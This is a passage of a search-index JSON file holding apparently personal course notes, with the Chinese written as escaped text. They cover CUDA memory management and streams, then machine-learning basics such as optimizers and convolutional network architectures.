\u91cc\u8fdb\u884c\u540e\u9762\u7684\u8ba1\u7b97\u64cd\u4f5c\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u5728\u4e3b\u673a\u548c\u8bbe\u5907\u4e4b\u95f4\u7684\u8fc1\u79fb\u6b21\u6570\uff0c\u63d0\u9ad8\u6548\u7387","title":"\u7edf\u4e00\u5185\u5b58"},{"location":"hpc/hpc101/gpu/#_11","text":"\u4f46\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff08\u6bd4\u5982\u9700\u8981\u8fde\u7eed\u5927\u7247\u5185\u5b58\uff09\uff0c\u5219\u9884\u5148\u5c06\u5185\u5b58\u8fc1\u79fb\u51fa\u6765\u53ef\u4ee5\u89c4\u907f\u9875\u9519\u8bef\uff0c\u5e76\u4e14\u51cf\u5c11\u6309\u9700\u5185\u5b58\u8fc1\u79fb\u7684\u6210\u672c CUDA \u53ef\u901a\u8fc7 cudaMemPrefetchAsync \u51fd\u6570\u6765\u5c06 UM \u9884\u53d6\u5230\u67d0\u4e00\u8bbe\u5907\u4e2d\uff0c\u6bd4\u5982\uff1a int deviceId ; cudaGetDevice ( & deviceId ); cudaMemPrefetchAsync ( pointerToSomeUMData , size , deviceId ); ... cudaMemPrefetchAsync ( pointerToSomeUMData , size , cudaCpuDeviceId ); cudaMemPrefetchAsync \u9700\u8981\u63d0\u4f9b UM \u7684\u6307\u9488\u3001\u5927\u5c0f\u3001\u4ee5\u53ca\u8981\u9884\u53d6\u5230\u7684\u8bbe\u5907\u3002\u5176\u4e2d deviceId \u901a\u8fc7 cudaGetDevice \u83b7\u53d6\uff0ccudaCpuDeviceId \u662f CUDA \u5185\u7f6e\u53d8\u91cf\uff0c\u8868\u793a CPU","title":"\u5f02\u6b65\u5185\u5b58\u9884\u53d6"},{"location":"hpc/hpc101/gpu/#_12","text":"\u4e00\u4e9b\u624b\u52a8\u5185\u5b58\u7ba1\u7406\u7684 CUDA \u51fd\u6570\uff1a cudaMalloc \uff1a\u76f4\u63a5\u4e3a GPU \u5206\u914d\u5185\u5b58\uff0c\u9632\u6b62\u51fa\u73b0 GPU \u5206\u9875\u9519\u8bef\uff0c\u4f46\u662f CPU \u65e0\u6cd5\u8bbf\u95ee\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488 cudaMallocHost \uff1a\u76f4\u63a5\u4e3a CPU \u5206\u914d\u5185\u5b58\uff0c\u79f0\u4e3a\u56fa\u5b9a\u5185\u5b58\uff08pinned memory\uff09\u6216\u9875\u9501\u5b9a\u5185\u5b58\uff08page-locked memory\uff09\uff0c\u5141\u8bb8\u5c06\u5185\u5b58\u5f02\u6b65\u62f7\u8d1d\u5230 GPU \u6216\u4ece GPU \u5f02\u6b65\u62f7\u8d1d\u56de\u6765\u3002\u4f46\u56fa\u5b9a\u5185\u5b58\u8fc7\u591a\u4f1a\u5e72\u6270 CPU \u6027\u80fd\u3002\u91ca\u653e\u65f6\u4f7f\u7528 cudaFreeHost cudaMemcpy \uff1a\u4e3b\u673a\u4e0e\u8bbe\u5907\u4e4b\u95f4\u62f7\u8d1d\u5185\u5b58 cudaMemcpyAsync \uff1a\u4e3b\u673a\u4e0e\u8bbe\u5907\u4e4b\u95f4\u5f02\u6b65\u62f7\u8d1d\u5185\u5b58 \u793a\u4f8b\uff1a int * host_a , * device_a ; // Define host-specific and device-specific arrays. cudaMalloc ( & device_a , size ); // `device_a` is immediately available on the GPU. cudaMallocHost ( & host_a , size ); // `host_a` is immediately available on CPU, and is page-locked, or pinned. initializeOnHost ( host_a , N ); // No CPU page faulting since memory is already allocated on the host. // `cudaMemcpy` takes the destination, source, size, and a CUDA-provided variable for the direction of the copy. cudaMemcpy ( device_a , host_a , size , cudaMemcpyHostToDevice ); kernel <<< blocks , threads , 0 , someStream >>> ( device_a , N ); // `cudaMemcpy` can also copy data from device to host. cudaMemcpy ( host_a , device_a , size , cudaMemcpyDeviceToHost ); verifyOnHost ( host_a , N ); cudaFree ( device_a ); cudaFreeHost ( host_a ); // Free pinned memory like this.","title":"\u624b\u52a8\u5185\u5b58\u5206\u914d"},{"location":"hpc/hpc101/gpu/#cuda_1","text":"\u5728 CUDA \u4e2d\uff0c\u6838\u51fd\u6570\u7684\u6267\u884c\u4ee5\u53ca\u4e00\u4e9b\u5185\u5b58\u4f20\u8f93\u5747\u5728 CUDA \u6d41\uff08CUDA Streams\uff09\u4e2d\u8fdb\u884c\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u542f\u52a8\u6838\u51fd\u6570\u4f1a\u5728\u9ed8\u8ba4\u6d41\u4e2d\u6267\u884c \u5728\u6bcf\u4e00\u4e2a\u6d41\u4e2d\uff0c\u4e0d\u540c\u7684\u6838\u51fd\u6570\u5206\u522b\u6267\u884c\uff1b\u4f46\u5728\u4e0d\u540c\u6d41\u4e2d\uff0c\u53ef\u4ee5\u5e76\u53d1\u6267\u884c\u591a\u4e2a\u6838\u51fd\u6570 CUDA \u6d41\u884c\u4e3a\u7684\u51e0\u9879\u89c4\u5219\uff1a \u7ed9\u5b9a\u6d41\u4e2d\u7684\u6240\u6709\u64cd\u4f5c\u6309\u5e8f\u6267\u884c \u4e0d\u540c\u975e\u9ed8\u8ba4\u6d41\u4e2d\u7684\u64cd\u4f5c\u65e0\u6cd5\u4fdd\u8bc1\u5f7c\u6b64\u4e4b\u95f4\u7684\u6267\u884c\u987a\u5e8f \u9ed8\u8ba4\u6d41\u6709\u963b\u65ad\u80fd\u529b\uff0c\u5373\u5b83\u4f1a\u7b49\u5f85\u5176\u5b83\u5df2\u5728\u8fd0\u884c\u7684\u6240\u6709\u6d41\u5b8c\u6210\u5f53\u524d\u64cd\u4f5c\u4e4b\u540e\u624d\u4f1a\u8fd0\u884c\uff0c\u5e76\u4e14\u5728\u81ea\u8eab\u8fd0\u884c\u5b8c\u6bd5\u4e4b\u540e\u5176\u4ed6\u6d41\u624d\u53ef\u4ee5\u7ee7\u7eed\u4e0b\u4e00\u64cd\u4f5c\u7684\u8fd0\u884c \u4e5f\u5c31\u662f\uff1a \u6838\u51fd\u6570\u5728\u5404\u6d41\u4e2d\u6267\u884c\u7684\u60c5\u51b5\u4e5f\u53ef\u4ee5\u901a\u8fc7 nsys \u53ef\u89c6\u5316\u5206\u6790\u770b\u51fa\u6765","title":"\u5e76\u53d1 CUDA \u6d41"},{"location":"hpc/hpc101/gpu/#_13","text":"CUDA \u4e2d\u6d41\u7684\u7c7b\u578b\u4e3a cudaStream_t \uff0c\u5e76\u4e14\u5229\u7528 cudaStreamCreate \u521b\u5efa\u975e\u9ed8\u8ba4\u6d41\uff0c\u7136\u540e\u4f5c\u4e3a\u7b2c\u56db\u4e2a\u6267\u884c\u914d\u7f6e\u53c2\u6570\u4f20\u7ed9\u6838\u51fd\u6570\u3002\u5728\u4f7f\u7528\u540e\u5229\u7528 cudaStreamDestroy \u9500\u6bc1\u6d41\u3002\u4e00\u4e2a\u4f8b\u5b50\uff1a cudaStream_t stream ; cudaStreamCreate ( & stream ); kernel <<< number_of_blocks , threads_per_block , 0 , stream >>> (); cudaStreamDestroy ( stream ); \u51e0\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\uff1a cudaStreamCreate \u63a5\u6536 stream \u7684\u6307\u9488 cudaStreamDestroy \u63a5\u6536 stream \u503c\uff08\u4e0d\u662f\u6307\u9488\uff09 \u6267\u884c\u914d\u7f6e\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e0e\u5171\u4eab\u5185\u5b58\uff08Shared Memory\uff09\u6709\u5173\uff0c\u9ed8\u8ba4\u4e3a 0","title":"\u521b\u5efa\u3001\u4f7f\u7528\u3001\u9500\u6bc1\u975e\u9ed8\u8ba4\u6d41"},{"location":"hpc/hpc101/gpu/#_14","text":"\u5728\u4ee5\u4e0b\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5e76\u975e\u5728\u7b49\u5f85\u6574\u4e2a\u5185\u5b58\u62f7\u8d1d\u5b8c\u6210\u4e4b\u540e\u518d\u5f00\u59cb\u8fd0\u884c\u6838\u51fd\u6570\uff0c\u800c\u662f\u62f7\u8d1d\u5e76\u5904\u7406\u6240\u9700\u7684\u6570\u636e\u6bb5\uff0c\u5e76\u8ba9\u6bcf\u4e2a\u62f7\u8d1d/\u5904\u7406\u4e2d\u7684\u6570\u636e\u6bb5\u5747\u5728\u5404\u81ea\u7684\u975e\u9ed8\u8ba4\u6d41\u4e2d\u8fd0\u884c\u3002\u901a\u8fc7\u4f7f\u7528\u6b64\u6280\u672f\uff0c\u60a8\u53ef\u4ee5\u5f00\u59cb\u5904\u7406\u90e8\u5206\u6570\u636e\uff0c\u540c\u65f6\u4e3a\u540e\u7eed\u6bb5\u5e76\u53d1\u6267\u884c\u5185\u5b58\u4f20\u8f93\u3002\u4f7f\u7528\u6b64\u6280\u672f\u8ba1\u7b97\u64cd\u4f5c\u6b21\u6570\u7684\u6570\u636e\u6bb5\u7279\u5b9a\u503c\u548c\u6570\u7ec4\u5185\u7684\u504f\u79fb\u4f4d\u7f6e\u65f6\u5fc5\u987b\u683c\u5916\u5c0f\u5fc3\uff0c\u5982\u4e0b\u6240\u793a\uff1a int N = 2 << 24 ; int size = N * sizeof ( int ); int * host_array ; int * device_array ; cudaMallocHost ( & host_array , size ); // Pinned host memory allocation. cudaMalloc ( & device_array , size ); // Allocation directly on the active GPU device. initializeData ( host_array , N ); // Assume this application needs to initialize on the host. const int numberOfSegments = 4 ; // This example demonstrates slicing the work into 4 segments. int segmentN = N / numberOfSegments ; // A value for a segment's worth of `N` is needed. size_t segmentSize = size / numberOfSegments ; // A value for a segment's worth of `size` is needed. // For each of the 4 segments... for ( int i = 0 ; i < numberOfSegments ; ++ i ) { // Calculate the index where this particular segment should operate within the larger arrays. segmentOffset = i * segmentN ; // Create a stream for this segment's worth of copy and work. cudaStream_t stream ; cudaStreamCreate ( & stream ); // Asynchronously copy segment's worth of pinned host memory to device over non-default stream. cudaMemcpyAsync ( & device_array [ segmentOffset ], // Take care to access correct location in array. & host_array [ segmentOffset ], // Take care to access correct location in array. segmentSize , // Only copy a segment's worth of memory. cudaMemcpyHostToDevice , stream ); // Provide optional argument for non-default stream. // Execute segment's worth of work over same non-default stream as memory copy. kernel <<< number_of_blocks , threads_per_block , 0 , stream >>> ( & device_array [ segmentOffset ], segmentN ); // `cudaStreamDestroy` will return immediately (is non-blocking), but will not actually destroy stream until // all stream operations are complete. cudaStreamDestroy ( stream ); }","title":"\u4f7f\u7528\u6d41\u5b9e\u73b0\u6570\u636e\u4f20\u8f93\u548c\u4ee3\u7801\u7684\u91cd\u53e0\u6267\u884c"},{"location":"hpc/hpc101/ml/","text":"\u673a\u5668\u5b66\u4e60\u57fa\u7840 \u00b6 Abstract \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516b\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e94\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516b\u6b21\u8bfe\u8bfe\u4ef6 \u673a\u5668\u5b66\u4e60\u57fa\u7840 \u00b6 \u7ebf\u6027\u56de\u5f52 \u00b6 \u4e00\u7ef4\uff1a \\(\\hat{y} = wx + b\\) N \u7ef4\uff1a \\(\\hat{y} = \\mathbf{w}^\\top\\mathbf{x} + b\\) \u635f\u5931\u51fd\u6570\uff1a \\(l^{(i)}(\\mathbf{w}, b) = \\dfrac{1}{2}(\\hat{y}^{(i)}-y^{(i)})^2\\) \u68af\u5ea6\u4e0b\u964d\u6cd5\u6c42\u89e3\u53c2\u6570 \u68af\u5ea6\u4e0b\u964d \u00b6 \\(L(\\mathbf{w}, b) = \\sum_il^{(i)}(\\mathbf{w}, b)\\) \u7528 \\((\\mathbf{w}, b)-\\eta\\nabla L(\\mathbf{w}, b)\\) \u4ee3\u66ff \\((\\mathbf{w}, b)\\) \u5b66\u4e60\u7387 \\(\\eta\\) \uff0c\u8d85\u53c2\u6570\uff08\u7528\u6765\u63a7\u5236\u5b66\u4e60\uff09\uff0c\u4e0b\u964d\u7684\u5feb\u6162 \u5b66\u4e60\u7387\u8fc7\u5927\u4f1a\u5728\u6700\u4f18\u9644\u8fd1\u6a2a\u8df3 \u5b66\u4e60\u7387\u8fc7\u5c0f\u5219\u592a\u6162 \u6839\u636e\u8fdb\u5ea6\u66f4\u6539\u5b66\u4e60\u7387 Linear Decay Linear Warmup\uff1a\u5148\u5c0f\uff0c\u7136\u540e\u589e\u5927\uff0c\u518d\u7f13\u6162\u53d8\u5c0f SGD \u00b6 Minibatch S tochastic G radient D escent \u968f\u673a\u91c7\u7528\u4e00\u90e8\u5206\u6837\u672c\u6765\u8ba1\u7b97\u635f\u5931\u51fd\u6570 \\(L(\\mathbf{w}, b) = \\sum_{i\\in B}l^{(i)}(\\mathbf{w}, b)\\) Batch size \\(s=|B|\\) \u4e5f\u662f\u4e00\u4e2a\u8d85\u53c2\u6570 \\(s\\) \u5c0f\uff0c\u5de5\u4f5c\u91cf\u5c0f\uff0c\u62df\u5408\u6548\u679c\u4e0d\u597d \\(s\\) \u5927\uff0c\u5185\u5b58\u6d88\u8017\u9ad8 \u6df1\u5ea6\u5b66\u4e60\u57fa\u7840 \u00b6 \u591a\u5c42\u611f\u77e5\u5668 \u00b6 \u591a\u5c42\u611f\u77e5\u5668\uff08Multilayer Perceptrons\uff0c MLP\uff09\u662f\u4e00\u79cd\u524d\u5411\u7ed3\u6784\u7684\u4eba\u5de5\u795e\u7ecf\u7f51\u7edc\uff0c\u7ed3\u6784\u4f8b\u5982\uff1a \u8f93\u5165\u5c42\uff08Input Layer\uff09\uff1a \\(\\mathbf{x}\\in\\mathbb{R}^n\\) \u9690\u85cf\u5c42\uff08Hidden Layer\uff09\uff1a \\(\\mathbf{h} = \\sigma(\\mathbf{W_1x}+\\mathbf{b_1})\\) \\(\\mathbf{W_1}\\in\\mathbb{R}^{m\\times n}, \\mathbf{b_1}\\in\\mathbb{R}^m, \\mathbf{h}\\in\\mathbb{R}^m\\) \\(\\sigma\\) \uff1a\u6fc0\u6d3b\u51fd\u6570\uff08activation function\uff09 \u53ef\u4ee5\u6709\u5f88\u591a\u9690\u85cf\u5c42\uff0c\u9010\u5c42\u4f20\u9012 \u8f93\u51fa\u5c42\uff08Output Layer\uff09\uff1a \\(\\mathbf{o} = \\mathbf{W_2h}+\\mathbf{b_2}\\) \\(\\mathbf{W_2}\\in\\mathbb{R}^{k\\times m}, \\mathbf{b_2}\\in\\mathbb{R}^k, \\mathbf{o}\\in\\mathbb{R}^k\\) \u7ed3\u679c\uff1a \\(\\mathbf{\\hat{y}}=\\sigma_2(\\mathbf{o})\\) \u524d\u5411\u4f20\u64ad\uff08Forward Propagation\uff09 \u00b6 \u6309\u987a\u5e8f\u4ece\u8f93\u5165\u5c42\u5f00\u59cb\u8ba1\u7b97\uff0c\u5f97\u5230\u6bcf\u4e00\u5c42\u7684\u8f93\u51fa\u7ed3\u679c \u53cd\u5411\u4f20\u64ad\uff08Back Propagation\uff09 \u00b6 \u5229\u7528\u94fe\u5f0f\u6cd5\u5219\u6765\u8ba1\u7b97\u795e\u7ecf\u7f51\u7edc\u4e2d\u5404\u53c2\u6570\u7684\u68af\u5ea6 \u6fc0\u6d3b\u51fd\u6570 \u00b6 \u6ca1\u6709\u6fc0\u6d3b\u51fd\u6570\u7684\u60c5\u51b5\uff1a \\(\\mathbf{h} = \\mathbf{W_1x}+\\mathbf{b_1}\\) \\(\\mathbf{o} = \\mathbf{W_2h}+\\mathbf{b_2} = \\mathbf{W_1W_2x}+\\mathbf{b_1}+\\mathbf{b_2}\\) \u4ecd\u4e3a\u7ebf\u6027\u7684 \u800c\u6fc0\u6d3b\u51fd\u6570\u4f7f\u5f97 \\(\\mathbf{h} = \\sigma(\\mathbf{W_1x}+\\mathbf{b_1})\\) \uff0c\u8ba9 MLP \u53d8\u4e3a\u975e\u7ebf\u6027\u7684 \u4e00\u4e9b\u6fc0\u6d3b\u51fd\u6570\uff1a sigmoid \uff1a \\(\\text{sigmoid}(x) = \\dfrac{1}{1+e^{-x}}\\) \uff0c\u5bfc\u6570\uff1a \\(\\text{sigmoid}(x)(1-\\text{sigmoid}(x))\\) tanh \uff1a \\(\\tanh(x) = \\dfrac{1-e^{-2x}}{1+e^{-2x}}\\) \uff0c\u5bfc\u6570\uff1a \\(1-\\tanh^2(x)\\) ReLU \uff1a \\(\\text{ReLU}(x)=\\max(x, 0)\\) Re ctified L inear U nit \u5c4f\u853d\u6389\u8d1f\u503c softmax \uff1a \\(\\text{softmax}(\\mathbf{o})_i = \\dfrac{e^{o_i}}{\\sum_{j=1}^ke^{o_j}}\\) \u5c06\u8f93\u51fa\u7684\u503c\u8f6c\u5316\u4e3a\u6982\u7387\uff08\u548c\u4e3a 1\uff09 \u89c4\u8303\u5316 \u00b6 #TODO\uff0cPPT 55-59 \u9875\uff0c\u6ca1\u61c2 \u4f18\u5316\u7b97\u6cd5 \u00b6 SGD\uff1a \\(W\\leftarrow W-\\eta\\nabla L(W)\\) SGD + Momentum \u00b6 SGD \u53ea\u4f9d\u8d56\u5f53\u524d batch \u8ba1\u7b97\u5f97\u5230\u7684\u68af\u5ea6\u6765\u66f4\u65b0\uff0c\u4e0d\u7a33\u5b9a\u3002\u5728\u68af\u5ea6\u4e0b\u964d\u8fc7\u7a0b\u4e2d\u52a0\u5165\u52a8\u91cf\uff0c\u7d2f\u79ef\u5386\u6b21\u8ba1\u7b97\u7684\u68af\u5ea6\uff0c\u4f7f\u4e4b\u66f4\u7a33\u5b9a\uff0c\u800c\u4e14\u9632\u6b62\u9677\u5165\u5c40\u90e8\u6700\u4f18\u89e3 \\(v\\leftarrow \\rho v+\\nabla L(W)\\) \\(v\\) \uff1a\"velocity\"\uff0c\u7d2f\u79ef\u7684\u68af\u5ea6 \\(\\rho\\) \uff1a\"friction\"\uff0c\u52a8\u91cf\u56e0\u5b50\uff0c\u4e00\u822c\u4e3a 0.9 \u6216 0.99 \\(W\\leftarrow W-\\eta v\\) AdaGrad \u00b6 \u8bbe\u7f6e\u5168\u5c40\u5b66\u4e60\u7387\u4e4b\u540e\uff0c\u6bcf\u6b21\u901a\u8fc7\u5168\u5c40\u5b66\u4e60\u7387\u9010\u53c2\u6570\u7684\u9664\u4ee5\u5386\u53f2\u68af\u5ea6\u5e73\u65b9\u548c\u7684\u5e73\u65b9\u6839\u4f7f\u5f97\u6bcf\u4e2a\u53c2\u6570\u7684\u5b66\u4e60\u7387\u4e0d\u540c \u5728\u53c2\u6570\u7a7a\u95f4\u66f4\u4e3a\u5e73\u7f13\u7684\u65b9\u5411\uff0c\u4f1a\u53d6\u5f97\u66f4\u5927\u7684\u8fdb\u6b65\uff08\u56e0\u4e3a\u5e73\u7f13\uff0c\u6240\u4ee5\u5386\u53f2\u68af\u5ea6\u5e73\u65b9\u548c\u8f83\u5c0f\uff0c\u5bf9\u5e94\u5b66\u4e60\u4e0b\u964d\u7684\u5e45\u5ea6\u8f83\u5c0f\uff09\uff0c\u5e76\u4e14\u80fd\u591f\u4f7f\u5f97\u9661\u5ced\u7684\u65b9\u5411\u53d8\u5f97\u5e73\u7f13\uff0c\u4ece\u800c\u52a0\u5feb\u8bad\u7ec3\u901f\u5ea6 \\(s\\leftarrow s+(\\nabla L(W))^2\\) \\(s\\) \uff1a\u7d2f\u79ef\u5e73\u65b9\u68af\u5ea6 \u5e73\u65b9\u662f\u9010\u5143\u7d20\u76f8\u4e58 \\(W\\leftarrow W-\\dfrac{\\eta}{\\sqrt{s}+\\epsilon}\\nabla L(W)\\) \\(\\epsilon\\) \uff1a\u4e3a\u4e86\u7ef4\u6301\u6570\u503c\u7a33\u5b9a\u6027\uff0c\u4e00\u822c\u4e3a \\(10^{-6}\\) \u6216 \\(10^{-7}\\) \u4e4b\u7c7b\u5c0f\u5e38\u6570 Adam \u00b6 \u5bf9\u68af\u5ea6\u7684\u4e00\u9636\u77e9\u4f30\u8ba1\uff08First Moment Estimation\uff0c\u5373\u68af\u5ea6\u7684\u5747\u503c\uff09\u548c\u4e8c\u9636\u77e9\u4f30\u8ba1\uff08Second Moment Estimation\uff0c\u5373\u68af\u5ea6\u7684\u672a\u4e2d\u5fc3\u5316\u7684\u65b9\u5dee\uff09\u8fdb\u884c\u7efc\u5408\u8003\u8651\uff0c\u8ba1\u7b97\u51fa\u66f4\u65b0\u6b65\u957f\uff0c\u6548\u679c\u66f4\u597d \u8fed\u4ee3\u6b21\u6570\u8bb0\u4e3a \\(i=1, \\dots, n\\) \\(v\\leftarrow \\beta_1v+(1-\\beta_1)\\nabla L(W)\\) \\(s\\leftarrow \\beta_2s+(1-\\beta_2)(\\nabla L(W))^2\\) Bias correction\uff1a \\(v'=\\dfrac{v}{1-\\beta_1^i}, s'=\\dfrac{s}{1-\\beta_2^i}\\) \\(W\\leftarrow W-\\eta\\dfrac{v'}{\\sqrt{s'}+\\epsilon}\\) \u4e00\u822c\u60c5\u51b5\u4e0b\u901a\u5e38\u8bbe \\(\\beta_1=0.9, \\beta_2=0.999, \\eta=10^{-3}\\) \u6216 \\(5\\times 10^{-4}\\) \u5377\u79ef\u795e\u7ecf\u7f51\u7edc \u00b6 \u5377\u79ef\u795e\u7ecf\u7f51\u7edc\uff08Convolutional Neural Network\uff0cCNN\uff09\u662f\u4e00\u7c7b\u5f3a\u5927\u7684\u3001\u4e3a\u5904\u7406\u56fe\u50cf\u6570\u636e\u800c\u8bbe\u8ba1\u7684\u795e\u7ecf\u7f51\u7edc \u5377\u79ef \u00b6 \u4e00\u7ef4\u5377\u79ef\uff1a \\[ (f*g)(x)=\\int_{-\\infty}^\\infty f(\\tau)g(t-\\tau)\\mathrm d\\tau \\] \u79bb\u6563\u5f62\u5f0f\uff1a \\[ (f*g)(n)=\\sum_{m=-\\infty}^\\infty f(m)g(n-m) \\] \u4e8c\u7ef4\u79bb\u6563\u5377\u79ef\uff1a \\[ (f*g)(i, j)=\\sum_a\\sum_bf(a, b)g(i-a, j-b) \\] \u56fe\u50cf\u5377\u79ef/\u4e92\u76f8\u5173\uff08cross-correlation\uff09 \u5e26 padding \u7684\u4e8c\u7ef4\u5377\u79ef \u5728\u5468\u56f4\u586b\u5145 \u53ef\u4ee5\u586b\u5145 0\uff0c\u4e5f\u53ef\u4ee5\u586b\u5145\u4e34\u8fd1\u7684\u6570 \u5e26\u6b65\u5e45\uff08stride\uff09\u7684\u4e8c\u7ef4\u5377\u79ef\uff08\u4e0b\u56fe\u6c34\u5e73\u6b65\u5e45\u4e3a 2\uff0c\u5782\u76f4\u6b65\u5e45\u4e3a 3\uff09 \u591a\u901a\u9053\u5377\u79ef\uff08\u4f1a\u964d\u7ef4\uff09 \u591a\u8f93\u51fa\u901a\u9053\u5377\u79ef\uff08\u5982\u56fe\u4e3a \\(1\\times 1\\) \u5377\u79ef\uff09 \u6c47\u805a\uff08\u6c60\u5316\uff09 \u00b6 \u6c60\u5316\u5373 pooling\uff0c\u4e0e\u5377\u79ef\u5c42\u7c7b\u4f3c\uff0c\u53ea\u662f\u4e0d\u8fdb\u884c\u4e58\u6cd5\u64cd\u4f5c\uff0c\u4e5f\u4e0d\u9700\u8981\u6838\uff0c\u53ea\u662f\u901a\u8fc7\u7a97\u53e3\u5212\u5206\u533a\u57df\uff0c\u7136\u540e\u505a\u52a0\u6cd5/\u53d6\u6700\u5927\u503c/\u53d6\u5e73\u5747\u3002\u4f8b\u5982\u6700\u5927\u6c47\u805a\u5c42\uff1a \u6c47\u805a\u5c42\u4f5c\u7528\uff1a\u964d\u4f4e\u5377\u79ef\u5c42\u5bf9\u4f4d\u7f6e\u7684\u654f\u611f\u6027\uff0c\u540c\u65f6\u964d\u4f4e\u5bf9\u7a7a\u95f4\u964d\u91c7\u6837\u8868\u793a\u7684\u654f\u611f\u6027 LeNet \u00b6 1989 \u5e74\u63d0\u51fa\u7684 CNN \u6a21\u578b\uff08LeNet-5\uff09\uff0c\u7528\u6765\u4ece 28*28 \u7684\u8f93\u5165\u56fe\u7247\u4e2d\u8bc6\u522b\u6570\u5b57\uff0c\u7ed3\u6784\uff1a \u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff1a \u5377\u79ef\u7f16\u7801\u5668\uff1a\u6bcf\u4e2a\u5377\u79ef\u5757\u662f\u4e00\u4e2a\u5377\u79ef\u5c42\uff085*5 \u5377\u79ef\u6838\uff0cpadding \u4e3a 2\uff09\uff0c\u4e00\u4e2a sigmoid \u6fc0\u6d3b\u51fd\u6570\uff0c\u4e00\u4e2a\u5e73\u5747\u6c47\u805a\u5c42\uff082*2 \u6c60\uff0cstride \u4e3a 2\uff09 \u7b2c\u4e00\u5c42\u6709 6 \u4e2a\u901a\u9053\uff0c\u7b2c\u4e8c\u5c42\u6709 16 \u4e2a\u901a\u9053 \u5168\u8fde\u63a5\u5c42\u5bc6\u96c6\u5757\uff1a\u6709\u4e09\u4e2a\u5168\u8fde\u63a5\u5c42\uff08\u4e2d\u95f4\u662f sigmoid \u6fc0\u6d3b\u51fd\u6570\uff09 \u4e09\u4e2a\u5168\u8fde\u63a5\u5c42\u8f93\u51fa\u4e2a\u6570\u4f9d\u6b21\u4e3a 120\u300184\u300110\uff08\u6700\u7ec8 10 \u4e2a\u6570\u5b57\uff09 \u73b0\u4ee3\u5377\u79ef\u795e\u7ecf\u7f51\u7edc \u00b6 AlexNet \u00b6 \u548c LeNet \u7ed3\u6784\u548c\u8bbe\u8ba1\u7406\u5ff5\u7c7b\u4f3c\u3002\u8f93\u5165\u4e00\u4e2a 224*224 \u5e26\u4e09\u901a\u9053\u7684\u56fe\u7247\uff0c\u8f93\u51fa\u8bc6\u522b\u51fa\u7684\u7269\u4f53\u7c7b\u522b\uff08\u4e00\u5171 1000 \u79cd\uff09\uff0c\u7ed3\u6784\uff1a \u56fe\u7247\uff083*224*224\uff09-> 11*11 \u5377\u79ef\u5c42\uff0896 \u901a\u9053\uff0cstride 4\uff09-> 3*3 \u6700\u5927\u6c47\u805a\u5c42\uff08stride 2\uff09-> 5*5 \u5377\u79ef\u5c42\uff08256 \u901a\u9053\uff0cpadding 2\uff09-> 3*3 \u6700\u5927\u6c47\u805a\u5c42\uff08stride 2\uff09-> 3*3 \u5377\u79ef\u5c42\uff08384 \u901a\u9053\uff0cpadding 1\uff09-> 3*3 \u5377\u79ef\u5c42\uff08384 \u901a\u9053\uff0cpadding 1\uff09-> 3*3 \u5377\u79ef\u5c42\uff08256 \u901a\u9053\uff0cpadding 1\uff09-> 3*3 \u6700\u5927\u6c47\u805a\u5c42\uff08stride 2\uff09-> \u5168\u8fde\u63a5\u5c42\uff08\u8f93\u51fa 4096\uff09-> \u5168\u8fde\u63a5\u5c42\uff08\u8f93\u51fa 4096\uff09-> \u5168\u8fde\u63a5\u5c42\uff08\u8f93\u51fa 1000\uff09 \u6fc0\u6d3b\u51fd\u6570\u4f7f\u7528 ReLU VGG \u00b6 \u4f7f\u7528\u4e86\u66f4\u5c0f\u7684\u5377\u79ef\u6838\uff083*3\uff09\u548c 2*2 \u7684\u6700\u5927\u6c47\u805a\u5c42\uff0c\u6709\u66f4\u6df1\u7684\u5c42\u7ea7\uff0816-19 \u5c42\uff09 GoogLeNet \u00b6 \u4f7f\u7528\u4e86 Inception \u5757\uff1a ResNet \u00b6 \u5373\u6b8b\u5dee\u7f51\u7edc\uff0c\u4f7f\u7528\u4e86\u6b8b\u5dee\u5757\uff0c\u5b66\u4e60 \\(f(x)-x\\) \u6765\u786e\u4fdd \\(\\mathcal{F}_i\\subset\\mathcal{F}_{i+1}\\) \uff0c\u9010\u6b21\u6536\u655b\u5230\"\u771f\u5b9e\"\u51fd\u6570 \\(f^*\\) \u8fc1\u79fb\u5b66\u4e60 \u00b6 \u8fc1\u79fb\u5b66\u4e60\uff08Transfer Learning\uff09\u662f\u6307\u5728\u539f\u6709\u6570\u636e\u96c6\u8bad\u7ec3\u597d\u53c2\u6570\u540e\uff0c\u66f4\u6362\u6570\u636e\u96c6\u65f6\u53ea\u9700\u8981\u91cd\u65b0\u8bad\u7ec3\u5168\u8fde\u63a5\u90e8\u5206 \u5bf9\u4e8e\u5c0f\u6570\u636e\u96c6\uff0c\u4ec5\u521d\u59cb\u5316\u5168\u8fde\u63a5\u8f93\u51fa\u5c42\u5e76\u91cd\u65b0\u8bad\u7ec3\uff0c\u56fa\u5b9a\u5176\u5b83\u5c42\u53c2\u6570\uff0c\u53ea\u6539\u53d8\u5168\u8fde\u63a5\u8f93\u51fa\u5c42\u53c2\u6570 \u5bf9\u4e8e\u5927\u6570\u636e\u96c6\uff0c\u4ec5\u521d\u59cb\u5316\u5168\u8fde\u63a5\u8f93\u51fa\u5c42\u548c\u5168\u8fde\u63a5\u9690\u85cf\u5c42\uff0c\u56fa\u5b9a\u5176\u5b83\u5c42\u53c2\u6570\uff0c\u91cd\u65b0\u8bad\u7ec3 \u5faa\u73af\u795e\u7ecf\u7f51\u7edc \u00b6 \u5faa\u73af\u795e\u7ecf\u7f51\u7edc\uff08Recurrent Neural Network\uff0cRNN\uff09\u53ef\u4ee5\u66f4\u597d\u5730\u5904\u7406\u5e8f\u5217\u4fe1\u606f \u8fd9\u91cc\u672c\u5e94\u6709\u66f4\u591a\u5185\u5bb9\uff0c\u4f46\u662f\u61d2\u5f97\u5199\u4e86 _(:\u0437\u300d\u2220)_","title":"\u673a\u5668\u5b66\u4e60\u57fa\u7840"},{"location":"hpc/hpc101/ml/#_1","text":"Abstract 